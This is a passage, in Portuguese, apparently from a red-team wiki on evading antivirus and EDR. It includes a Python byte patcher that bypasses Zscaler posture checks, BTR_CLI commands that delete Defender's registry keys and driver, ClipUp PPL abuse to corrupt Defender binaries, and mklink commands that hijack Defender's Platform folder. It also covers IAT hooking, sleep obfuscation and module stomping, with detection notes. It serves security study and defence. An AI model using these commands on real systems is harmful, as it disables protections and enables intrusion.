O **Client Connector** da Zscaler aplica regras de postura do dispositivo localmente e depende do RPC do Windows para comunicar os resultados a outros componentes. Duas escolhas de design frágeis tornam possível um bypass completo:

1. A avaliação de postura ocorre **inteiramente no client-side** (um booleano é enviado ao servidor).
2. Os endpoints RPC internos apenas validam se o executável que se conecta é **assinado pela Zscaler** (por meio de `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Ao **aplicar patches em quatro binários assinados no disco**, ambos os mecanismos podem ser neutralizados:

| Binário | Lógica original alterada | Resultado |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Sempre retorna `1`, então todas as verificações são aprovadas |
| `ZSAService.exe` | Chamada indireta a `WinVerifyTrust` | Substituída por NOP ⇒ qualquer processo (mesmo sem assinatura) pode se conectar aos pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Substituída por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Verificações de integridade do túnel | Desviadas |

Trecho mínimo do patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Após substituir os arquivos originais e reiniciar a pilha de serviços:

* **Todas** as verificações de postura exibem **verde/conforme**.
* Binários não assinados ou modificados conseguem abrir os endpoints RPC de named pipe (por exemplo, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* O host comprometido obtém acesso irrestrito à rede interna definida pelas políticas do Zscaler.

Este estudo de caso demonstra como decisões de confiança puramente do lado do cliente e verificações simples de assinatura podem ser contornadas com alguns patches de bytes.

## Abuso da funcionalidade confiável do Microsoft Defender `BTR.sys`

O driver **Boot-Time Removal** do Defender é um contraponto útil ao BYOVD clássico. `BTR.sys` é um componente legítimo de remediação assinado pela Microsoft, sem bug de corrupção de memória nem interface IOCTL; em vez disso, após obter acesso de administrador e `SeLoadDriverPrivilege`, um operador pode forjar sua transação privada de remediação e executar operações intencionais de arquivo/registro em Ring-0. Isso é uma **primitiva de neutralização de AV/EDR pós-comprometimento, não de acesso inicial nem de escalonamento de privilégios**, e o driver pode ser extraído do recurso `BOOTTIMETOOL` do próprio `MpEngine.dll` do alvo, em vez de importar um driver conspícuo de terceiros.<sup>[[36]](#references)</sup>

### Preparando o driver de execução única

Normalmente, o Defender grava o recurso em um arquivo aleatório `[a-z]{8}.sys` e registra um serviço de kernel com nome semelhante. `DriverEntry` lê o valor `Args` do serviço, abre o ADS NTFS referenciado, descriptografa e valida a lista de ações, grava o feedback e retorna `0xC0000056` (`STATUS_DELETE_PENDING`) após a execução bem-sucedida, fazendo com que o driver seja descarregado em vez de permanecer residente. Um serviço forjado apresenta os seguintes valores característicos.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

O fluxo `:changelist` contém um blob criptografado com RC4. As builds analisadas reutilizam uma chave fixa de 256 bytes, portanto a criptografia não é uma barreira de autorização. Um plaintext válido tem um cabeçalho global de 24 bytes (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC do cabeçalho e um ID de transação derivado do payload), seguido por um caminho de feedback UTF-16 terminado em nulo e qualquer quantidade de itens. Cada item tem um cabeçalho de 16 bytes (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`), além de dados específicos da ação terminados em **exatamente quatro bytes NUL**. Cada região do cabeçalho/dados é verificada independentemente com CRC-32, polinômio `0xEDB88320`, estado inicial `0xFFFFFFFF` e **sem XOR final** (`~CRC32`); o estado do CRC é reiniciado para cada região.<sup>[[36]](#references)[[37]](#references)</sup>

Os IDs de ação aceitos expõem estas primitivas do kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dados do item | Resultado |
| --- | --- | --- |
| 1 | `[caminho UTF-16]` | Excluir um arquivo, incluindo um arquivo bloqueado |
| 2 | `[caminho UTF-16]` | Remover um diretório vazio |
| 3 | `[Flags][origem][destino]` | Mover um arquivo para um caminho protegido escolhido pelo atacante; um destino vazio significa excluir |
| 4 | `[Flags][caminho da chave]` | Excluir recursivamente uma chave do registro |
| 5 | `[Flags][caminho da chave + "\\" + valor]` | Excluir um valor do registro |
| 6 | `[Flags][tipo][tamanho][caminho da chave + "\\" + valor][dados]` | Criar/atualizar um valor do registro e criar caminhos de chave ausentes |

Nas ações 5 e 6, o separador de chave/valor no formato transmitido são **duas barras invertidas consecutivas**; um caminho formatado convencionalmente não será dividido corretamente. O arquivo de feedback espelha, em grande parte, a solicitação, mas os primeiros quatro bytes de dados de cada item passam a conter seu `NTSTATUS` resultante. Nas ações 1 e 2, que não têm um campo de flags inicial, o BTR desloca o caminho para os quatro bytes reservados finais, abrindo espaço para esse status.<sup>[[36]](#references)</sup>

### Fluxo de trabalho do `BTR_CLI` e janela de inicialização antecipada

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementa a cadeia completa: extrair `BTR.sys` do Defender local, criar `<random>.sys:changelist` e um fluxo de feedback, serializar/verificar somas de verificação/criptografar ações encadeadas, criar diretamente a chave de registro do serviço e, em seguida, chamar `NtLoadDriver` para `-trigger now` ou deixar o driver configurado para iniciar com o sistema usando `-trigger boot`. O preparo direto no registro evita o caminho normal `CreateServiceW` do SCM e, portanto, **não** gera o Event ID 7045 de instalação de serviço. Artefatos acionados na inicialização podem ser removidos posteriormente com `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` não é utilizável porque o BTR realiza operações de E/S de arquivos a partir de `DriverEntry`, antes que a pilha de armazenamento e o link `SystemRoot` estejam prontos. `Start=1` combinado com o grupo de alta prioridade `Boot Bus Extender` executa na Fase 1: o NTFS está disponível, mas muitos drivers de segurança com inicialização do sistema e serviços de EDR em user-mode ainda não foram inicializados. Filtros de inicialização, como `WdFilter`, podem já estar carregados, mas o BTR pode remover seus binários ou configurações de serviço antes da próxima inicialização e excluir executáveis de serviço antes que o SCM os inicie. O ELAM não fecha essa lacuna porque o BTR é executado após a avaliação dos drivers de inicialização e tem uma assinatura válida da Microsoft.<sup>[[36]](#references)</sup>

Várias ações são executadas em uma única transação. A PoC antepõe a Ação 1 para o caminho fixo `\SystemRoot\Temp\BootClean.log`: o BTR cria esse log, depois processa sua própria solicitação de exclusão e o remove antes de descarregar. Isso reduz as evidências, enquanto armazenar o feedback em `<random>.sys:<random>.dat` permite remover o driver e os dois fluxos juntos.<sup>[[36]](#references)[[37]](#references)</sup>

### Correlações de detecção de alto sinal

Regras baseadas apenas em assinatura e a lista de bloqueio de drivers vulneráveis da Microsoft não abordam o abuso da funcionalidade prevista do BTR. Prefira estas correlações comportamentais, distinguindo a linhagem legítima do Defender de um iniciador arbitrário.<sup>[[36]](#references)</sup>

- **Sysmon 15:** a criação de `.sys:changelist` é universal no staging do BTR. Um ADS `.dat` anexado ao mesmo `.sys` é especialmente suspeito, pois o Defender legítimo normalmente armazena o feedback em `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 sem System 7045:** correlacione a criação direta de `HKLM\SYSTEM\CurrentControlSet\Services\<random>` contendo `Args=...:changelist` e `Group=Boot Bus Extender` com a ausência de um evento correspondente de instalação do SCM.
- **Sysmon 6 -> 23:** correlacione o carregamento de um driver BTR conhecido, proveniente de uma linhagem que não seja do Defender, com a exclusão subsequente de arquivos atribuída a `System`/PID 4, especialmente quando se tratar de binários de segurança.
- **Sysmon 11 -> 23:** gere um alerta para a criação e exclusão rápidas de `\SystemRoot\Temp\BootClean.log` por `System`/PID 4.
- Restrinja e audite a atribuição/ativação de `SeLoadDriverPrivilege`; uma assinatura da Microsoft, por si só, não é suficiente para confiar quando um driver de ferramenta de segurança é preparado por `cmd.exe`, PowerShell ou um processo desconhecido.

## Abusando do Protected Process Light (PPL) para adulterar AV/EDR com LOLBINs

O Protected Process Light (PPL) impõe uma hierarquia de signatário/nível, de modo que somente processos protegidos de nível igual ou superior possam adulterar uns aos outros. Do ponto de vista ofensivo, se você puder iniciar legitimamente um binário habilitado para PPL e controlar seus argumentos, poderá transformar uma funcionalidade benigna (por exemplo, logging) em uma primitiva de gravação restrita, protegida por PPL, contra diretórios protegidos usados por AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

O que faz um processo ser executado como PPL
- O EXE de destino (e quaisquer DLLs carregadas) deve ser assinado com um EKU compatível com PPL.
- O processo deve ser criado com CreateProcess usando os sinalizadores: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve ser solicitado um nível de proteção compatível com o signatário do binário (por exemplo, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para signatários antimalware, `PROTECTION_LEVEL_WINDOWS` para signatários do Windows). Níveis incorretos farão a criação falhar.

Veja também uma introdução mais abrangente a PP/PPL e à proteção do LSASS aqui:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Ferramentas de inicialização
- Ferramenta auxiliar de código aberto: CreateProcessAsPPL (seleciona o nível de proteção e encaminha os argumentos ao EXE de destino):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Padrão de uso:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- O binário de sistema assinado `C:\Windows\System32\ClipUp.exe` inicia um processo filho e aceita um parâmetro para gravar um arquivo de log em um caminho especificado pelo chamador.
- Quando iniciado como um processo PPL, a gravação do arquivo ocorre com proteção PPL.
- ClipUp não consegue analisar caminhos que contenham espaços; use caminhos curtos 8.3 para apontar para locais normalmente protegidos.

Auxiliares para caminhos curtos 8.3
- Listar nomes curtos: `dir /x` em cada diretório pai.
- Obter o caminho curto no cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Cadeia de abuso (abstrata)
1) Inicie o LOLBIN compatível com PPL (ClipUp) com `CREATE_PROTECTED_PROCESS`, usando um lançador (por exemplo, CreateProcessAsPPL).
2) Passe o argumento de caminho do log do ClipUp para forçar a criação de um arquivo em um diretório de AV protegido (por exemplo, Defender Platform). Use nomes curtos 8.3, se necessário.
3) Se o binário de destino normalmente estiver aberto/bloqueado pelo AV durante a execução (por exemplo, MsMpEng.exe), agende a gravação na inicialização, antes de o AV iniciar, instalando um serviço de início automático que seja executado com segurança mais cedo. Valide a ordem de inicialização com o Process Monitor (registro de inicialização).
4) Na reinicialização, a gravação protegida por PPL ocorre antes que o AV bloqueie os binários, corrompendo o arquivo de destino e impedindo a inicialização.

Exemplo de invocação (caminhos ocultados/encurtados por segurança):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Observações e restrições
- Você não pode controlar o conteúdo que o ClipUp grava, apenas o local; essa primitiva é adequada para corrupção, não para injeção precisa de conteúdo.
- Requer admin local/SYSTEM para instalar/iniciar um serviço e uma janela de reinicialização.
- O timing é crítico: o alvo não pode estar aberto; a execução durante a inicialização evita bloqueios de arquivo.

Detecções
- Criação do processo `ClipUp.exe` com argumentos incomuns, especialmente quando iniciado por launchers não padrão, próximo à inicialização.
- Novos serviços configurados para iniciar automaticamente binários suspeitos e iniciados consistentemente antes do Defender/AV. Investigue a criação/modificação de serviços antes de falhas na inicialização do Defender.
- Monitoramento da integridade de arquivos dos binários/diretórios Platform do Defender; criações/modificações inesperadas de arquivos por processos com flags de protected-process.
- Telemetria ETW/EDR: procure processos criados com `CREATE_PROTECTED_PROCESS` e uso anômalo do nível PPL por binários que não sejam de AV.

Mitigações
- WDAC/Code Integrity: restrinja quais binários assinados podem ser executados como PPL e sob quais processos pai; bloqueie a invocação do ClipUp fora de contextos legítimos.
- Higiene de serviços: restrinja a criação/modificação de serviços de inicialização automática e monitore a manipulação da ordem de inicialização.
- Certifique-se de que a proteção contra adulteração do Defender e as proteções de inicialização antecipada estejam habilitadas; investigue erros de inicialização que indiquem corrupção de binários.
- Considere desabilitar a geração de nomes curtos 8.3 nos volumes que hospedam ferramentas de segurança, se isso for compatível com seu ambiente (teste minuciosamente).

## Adulteração do Microsoft Defender via Hijack de Symlink da Pasta de Versão do Platform

O Windows Defender escolhe a plataforma a partir da qual é executado enumerando as subpastas em:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Ele seleciona a subpasta com a string de versão lexicograficamente mais alta (por exemplo, `4.18.25070.5-0`) e, em seguida, inicia os processos de serviço do Defender a partir dela (atualizando os caminhos do serviço/registro de acordo). Essa seleção confia nas entradas de diretório, incluindo pontos de nova análise de diretório (symlinks). Um administrador pode explorar isso para redirecionar o Defender para um caminho gravável por um atacante e conseguir DLL sideloading ou interrupção do serviço.<sup>[[21]](#references)[[22]](#references)</sup>

Pré-requisitos
- Administrador local (necessário para criar diretórios/symlinks na pasta Platform)
- Capacidade de reinicializar ou acionar a nova seleção da plataforma do Defender (reinício do serviço na inicialização)
- São necessárias apenas ferramentas integradas (mklink)

Por que funciona
- O Defender bloqueia gravações nas próprias pastas, mas sua seleção de plataforma confia nas entradas de diretório e escolhe a versão lexicograficamente mais alta sem validar se o destino aponta para um caminho protegido/confiável.

Passo a passo (exemplo)
1) Prepare um clone gravável da pasta da plataforma atual, por exemplo, `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crie um symlink de diretório com versão superior dentro de Platform apontando para sua pasta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Seleção do gatilho (reinicialização recomendada):
```cmd
shutdown /r /t 0
```
4) Verifique se MsMpEng.exe (WinDefend) é executado a partir do caminho redirecionado:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
You should observe o novo caminho do processo em `C:\TMP\AV\` e a configuração do serviço/registro refletindo esse local.

Post-exploitation options
- DLL sideloading/code execution: Solte/substitua DLLs que o Defender carrega do diretório do aplicativo para executar código nos processos do Defender. Consulte a seção acima: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remova o version-symlink para que, na próxima inicialização, o caminho configurado não seja resolvido e o Defender não consiga iniciar:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Observe que esta técnica não proporciona escalonamento de privilégios por si só; ela exige direitos de administrador.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

As equipes Red Team podem transferir a evasão em tempo de execução do implante C2 para o próprio módulo de destino, fazendo hook na Import Address Table (IAT) e encaminhando APIs selecionadas por meio de código independente de posição (PIC) controlado pelo atacante. Isso generaliza a evasão para além da pequena superfície de APIs exposta por muitos kits (por exemplo, CreateProcessA) e estende as mesmas proteções a BOFs e DLLs de pós-exploração.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Abordagem de alto nível
- Prepare um blob PIC junto ao módulo de destino usando um reflective loader (anexado antes do módulo ou como módulo complementar). O PIC precisa ser autocontido e independente de posição.
- À medida que a DLL hospedeira é carregada, percorra seu IMAGE_IMPORT_DESCRIPTOR e altere as entradas da IAT das importações visadas (por exemplo, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) para apontar para wrappers PIC leves.
- Cada wrapper PIC executa evasões antes de fazer tail-call para o endereço da API real. As evasões típicas incluem:
  - Mascarar/desmascarar memória ao redor da chamada (por exemplo, criptografar regiões do beacon, RWX→RX, alterar nomes/permissões de páginas) e depois restaurá-la.
  - Call-stack spoofing: construir uma stack benigna e fazer a transição para a API de destino, de modo que a análise da call stack identifique os frames esperados.<sup>[[9]](#references)</sup>
- Para garantir compatibilidade, exporte uma interface para que um script Aggressor (ou equivalente) possa registrar quais APIs devem receber hooks para Beacon, BOFs e DLLs de pós-exploração.

Por que usar IAT hooking aqui
- Funciona com qualquer código que use a importação com hook, sem modificar o código da ferramenta nem depender do Beacon para fazer proxy de APIs específicas.
- Abrange DLLs de pós-exploração: fazer hook em LoadLibrary* permite interceptar o carregamento de módulos (por exemplo, System.Management.Automation.dll, clr.dll) e aplicar a mesma evasão de mascaramento/stack às chamadas de API desses módulos.
- Restaura o uso confiável de comandos de pós-exploração que iniciam processos contra detecções baseadas em call stack, envolvendo CreateProcessA/W em wrappers.

Esboço mínimo de um hook de IAT (pseudocódigo em x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Aplique o patch após as relocations/ASLR e antes do primeiro uso da importação. Loaders refletivos como TitanLdr/AceLdr demonstram o hooking durante o DllMain do módulo carregado.
- Mantenha os wrappers pequenos e seguros para PIC; resolva a API verdadeira usando o valor original da IAT capturado antes do patch ou via LdrGetProcedureAddress.
- Use transições RW → RX para PIC e evite deixar páginas graváveis e executáveis.

Stub de spoofing de call stack
- Stubs PIC no estilo Draugr constroem uma cadeia de chamadas falsa (com endereços de retorno em módulos benignos) e então fazem pivot para a API real.
- Isso contorna detecções que esperam stacks canônicas de Beacon/BOFs para APIs sensíveis.
- Combine com técnicas de stack cutting/stack stitching para chegar aos frames esperados antes do prólogo da API.

Integração operacional
- Coloque o loader refletivo no início das DLLs post-ex para que o PIC e os hooks sejam inicializados automaticamente quando a DLL for carregada.
- Use um script Aggressor para registrar as APIs-alvo, permitindo que Beacon e BOFs se beneficiem da mesma rota de evasão sem alterações no código.

Considerações de detecção/DFIR
- Integridade da IAT: entradas que apontam para endereços que não pertencem a imagens (heap/anônimos); verificação periódica dos ponteiros de importação.
- Anomalias na stack: endereços de retorno que não pertencem a imagens carregadas; transições abruptas para PIC fora de imagens; ancestralidade inconsistente de RtlUserThreadStart.
- Telemetria do loader: escritas na IAT dentro do processo, atividade precoce no DllMain que modifica thunks de importação, regiões RX inesperadas criadas durante o carregamento.
- Evasão de carregamento de imagens: se houver hooking de LoadLibrary*, monitore carregamentos suspeitos de assemblies de automação/clr correlacionados a eventos de mascaramento de memória.

Blocos de construção e exemplos relacionados
- Loaders refletivos que fazem patching da IAT durante o carregamento (por exemplo, TitanLdr, AceLdr)
- Hooks de mascaramento de memória (por exemplo, simplehook) e PIC de stack cutting (stackcutting)
- Stubs PIC de spoofing de call stack (por exemplo, Draugr)


## Hooking da IAT no momento da importação + ofuscação durante o sleep (Crystal Palace/PICO)

### Hooks da IAT no momento da importação via PICO residente

Se você controla um loader refletivo, pode fazer hooking das importações **durante** `ProcessImports()` substituindo o ponteiro `GetProcAddress` do loader por um resolver personalizado que verifica primeiro os hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Crie um **PICO residente** (objeto PIC persistente) que continue existindo após o PIC temporário do loader se liberar.
- Exporte uma função `setup_hooks()` que sobrescreva o resolver de importações do loader (por exemplo, `funcs.GetProcAddress = _GetProcAddress`).
- Em `_GetProcAddress`, ignore importações por ordinal e use uma busca de hooks baseada em hash, como `__resolve_hook(ror13hash(name))`. Se houver um hook, retorne-o; caso contrário, delegue para o `GetProcAddress` real.
- Registre os alvos dos hooks no momento da linkagem com entradas Crystal Palace `addhook "MODULE$Func" "hook"`. O hook permanece válido porque está dentro do PICO residente.

Isso permite **redirecionar a IAT no momento da importação** sem fazer patch na seção de código da DLL carregada após o carregamento.

### Forçar importações passíveis de hooking quando o alvo usa PEB-walking

Os hooks no momento da importação só são acionados se a função estiver de fato na IAT do alvo. Se um módulo resolver APIs via PEB-walk + hash (sem entrada de importação), force uma importação real para que o caminho `ProcessImports()` do loader a detecte:

- Substitua a resolução de exports por hash (por exemplo, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) por uma referência direta, como `&WaitForSingleObject`.
- O compilador gera uma entrada na IAT, permitindo a interceptação quando o loader refletivo resolve as importações.

### Ofuscação de sleep/idle no estilo Ekko sem fazer patch em `Sleep()`

Em vez de fazer patch em `Sleep`, faça hooking das **primitivas reais de espera/IPC** usadas pelo implante (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Para esperas longas, envolva a chamada em uma cadeia de ofuscação no estilo Ekko que criptografa a imagem em memória durante o idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Use `CreateTimerQueueTimer` para agendar uma sequência de callbacks que chamam `NtContinue` com frames `CONTEXT` preparados.
- Cadeia típica (x64): defina a imagem como `PAGE_READWRITE` → criptografe com RC4 via `advapi32!SystemFunction032` a imagem mapeada inteira → execute a espera bloqueante → descriptografe com RC4 → **restaure as permissões de cada seção** percorrendo as seções PE → sinalize a conclusão.
- `RtlCaptureContext` fornece um `CONTEXT` de referência; clone-o em vários frames e defina registradores (`Rip/Rcx/Rdx/R8/R9`) para executar cada etapa.

Detalhe operacional: retorne “success” para esperas longas (por exemplo, `WAIT_OBJECT_0`) para que o chamador continue enquanto a imagem está mascarada. Esse padrão oculta o módulo dos scanners durante períodos de idle e evita a assinatura clássica de `Sleep()` com patch.

Ideias de detecção (baseadas em telemetria)
- Rajadas de callbacks de `CreateTimerQueueTimer` apontando para `NtContinue`.
- Uso de `advapi32!SystemFunction032` em buffers contíguos grandes, do tamanho de uma imagem.
- `VirtualProtect` aplicado a um intervalo grande, seguido pela restauração personalizada das permissões de cada seção.

### Registro de CFG em tempo de execução para gadgets de ofuscação de sleep

Em alvos com CFG habilitado, o primeiro salto indireto para um gadget no meio de uma função, como `jmp [rbx]` ou `jmp rdi`, normalmente causa a falha do processo com `STATUS_STACK_BUFFER_OVERRUN`, porque o gadget não está presente nos metadados CFG do módulo. Para manter cadeias no estilo Ekko/Kraken funcionando dentro de processos protegidos:<sup>[[30]](#references)</sup>

- Registre cada destino indireto usado pela cadeia com `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` e entradas `CFG_CALL_TARGET_VALID`.
- Para endereços dentro de imagens carregadas (`ntdll`, `kernel32`, `advapi32`), o `MEMORY_RANGE_ENTRY` deve começar na **base da imagem** e cobrir o **tamanho total da imagem**.
- Para regiões mapeadas manualmente/PIC/stomped, use a **base da alocação** e o tamanho da alocação.
- Marque não apenas o gadget de dispatch, mas também os exports alcançados indiretamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, syscalls de espera/evento) e quaisquer seções executáveis controladas pelo atacante que se tornarão destinos indiretos.

Isso transforma cadeias de sleep no estilo ROP/JOP de “funciona apenas em processos sem CFG” em uma primitiva reutilizável para `explorer.exe`, navegadores, `svchost.exe` e outros endpoints compilados com `/guard:cf`.

### Spoofing de stack compatível com CET para threads em sleep

A substituição completa de `CONTEXT` é ruidosa e pode falhar em sistemas com CET Shadow Stack, pois um `Rip` falsificado ainda precisa corresponder à shadow stack de hardware. Um padrão de mascaramento de sleep mais seguro é:<sup>[[30]](#references)</sup>

- Escolha outra thread no mesmo processo e leia os limites da stack do `NT_TIB`/TEB (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Faça backup do TEB/TIB real da thread atual.
- Capture o contexto real da thread em sleep com `GetThreadContext`.
- Copie **apenas** o `Rip` real para o contexto falsificado, mantendo intactos o `Rsp`/estado da stack falsificados.
- Durante o período de sleep, copie o `NT_TIB` da thread usada para spoofing para o TEB atual, para que os stack walkers façam unwind dentro de um intervalo legítimo de stack.
- Após o fim da espera, restaure o TIB original e o contexto da thread.

Isso preserva um ponteiro de instrução compatível com CET e, ao mesmo tempo, engana os stack walkers de EDR que confiam nos metadados da stack do TEB para validar os unwinds.

### Alternativa baseada em APC: Kraken Mask

Se o dispatch por timer queue for muito característico, a mesma sequência de sleep-encrypt-spoof-restore pode ser executada por uma thread auxiliar suspensa usando APCs enfileiradas:<sup>[[27]](#references)</sup>

- Crie uma thread auxiliar com `NtTestAlert` como entrypoint.
- Enfileire frames `CONTEXT`/APCs preparados com `NtQueueApcThread` e execute-os com `NtAlertResumeThread`.
- Armazene o estado da cadeia no heap, em vez de na stack auxiliar, para evitar esgotar a stack padrão de 64 KB da thread.
- Use `NtSignalAndWaitForSingleObject` para sinalizar atomicamente o evento de início e bloquear.
- Suspenda a thread principal antes de restaurar o TIB/contexto (`NtSuspendThread` → restore → `NtResumeThread`) para reduzir a janela de corrida em que um scanner poderia detectar uma stack parcialmente restaurada.

Isso troca a assinatura `CreateTimerQueueTimer` + `NtContinue` por uma assinatura de thread auxiliar/APC, mantendo os mesmos objetivos de mascaramento com RC4 e spoofing de stack.

Ideias adicionais de detecção
- `NtSetInformationVirtualMemory` com `VmCfgCallTargetInformation` pouco antes de sleeps, esperas ou dispatch de APC.
- `GetThreadContext`/`SetThreadContext` envolvendo `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ou `ConnectNamedPipe`.
- `NtQueryInformationThread` seguido de escritas diretas nos limites da stack do TEB/TIB da thread atual.
- Cadeias `NtQueueApcThread`/`NtAlertResumeThread` que chegam indiretamente a `SystemFunction032`, `VirtualProtect` ou helpers de restauração de permissões de seção.
- Uso repetido de assinaturas curtas de gadgets, como `FF 23` (`jmp [rbx]`) ou `FF E7` (`jmp rdi`), como pivôs de dispatch dentro de módulos assinados.


## Precision Module Stomping

O module stomping executa payloads a partir da **seção `.text` de uma DLL já mapeada no processo-alvo**, em vez de alocar memória executável privada óbvia ou carregar uma DLL sacrificável nova. O alvo de overwrite deve ser uma **imagem carregada e respaldada por disco**, cujo espaço de código possa acomodar o payload sem corromper caminhos de código que o processo ainda utiliza.<sup>[[1]](#references)[[2]](#references)</sup>

### Seleção confiável do alvo

O stomping ingênuo contra módulos comuns como `uxtheme.dll` ou `comctl32.dll` é frágil: a DLL pode não estar carregada no processo remoto, e uma região de código pequena demais pode causar a falha do processo. Um fluxo de trabalho mais confiável é:

1. Enumere os módulos do processo-alvo e mantenha uma lista de inclusão **somente com nomes** das DLLs já carregadas.
2. Primeiro, compile o payload e registre seu **tamanho exato em bytes**.
3. Examine DLLs candidatas no disco e compare o **`Misc_VirtualSize` da seção `.text`** PE com o tamanho do payload. Isso importa mais do que o tamanho do arquivo, pois reflete o tamanho da seção executável **quando mapeada na memória**.
4. Analise a **Export Address Table (EAT)** e escolha o RVA de uma função exportada como offset inicial do stomp.
5. Calcule o **raio de impacto**: se o payload ultrapassar o limite da função selecionada, sobrescreverá exports adjacentes dispostos depois dela na memória.

Helpers de recon/seleção comuns observados em uso:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Prefira DLLs **já carregadas** no processo remoto para evitar a telemetria de `LoadLibrary`/carregamentos inesperados de imagens.
- Prefira exports raramente executados pelo aplicativo-alvo; caso contrário, caminhos normais de código podem atingir os bytes sobrescritos antes ou depois da criação da thread.
- Implants grandes geralmente exigem alterar a incorporação do shellcode de uma string literal para um **inicializador de array de bytes/com chaves**, para que o buffer completo seja representado corretamente no código-fonte do injector.

Detection ideas
- Gravações remotas em páginas executáveis apoiadas por imagens (`MEM_IMAGE`, `PAGE_EXECUTE*`), em vez das alocações privadas RWX/RX mais comuns.
- Pontos de entrada de exports cujos bytes na memória não correspondem ao arquivo de apoio no disco.
- Threads remotas ou pivôs de contexto que começam a execução dentro de um export de DLL legítimo cujos primeiros bytes foram modificados recentemente.
- Sequências suspeitas de `VirtualProtect(Ex)` / `WriteProcessMemory` contra páginas `.text` de DLL, seguidas pela criação de thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) é uma técnica de **injeção de processo / evasão de EDR** que evita o caminho clássico de gravação remota (`VirtualAllocEx` + `WriteProcessMemory`). Em vez de copiar bytes para um alvo já em execução, ela abusa do fato de que o Windows **copia parâmetros de inicialização selecionados de `CreateProcessW` para o processo filho** e os armazena em `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carriers que podem ser envenenados e são copiados por `CreateProcessW`

Carriers úteis:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
